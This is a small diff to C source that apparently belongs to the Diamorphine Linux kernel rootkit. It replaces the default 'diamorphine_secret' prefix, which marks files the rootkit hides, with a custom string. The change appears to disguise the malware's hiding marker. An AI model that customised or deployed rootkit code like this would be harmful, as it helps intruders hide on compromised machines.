@@ -8,7 +8,7 @@ struct linux_dirent {
 #define START_MEM	PAGE_OFFSET
 #define END_MEM		ULONG_MAX
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "mrtn3lli"
 #define LOADAVG "loadavg"
 #define STAT "stat"
 
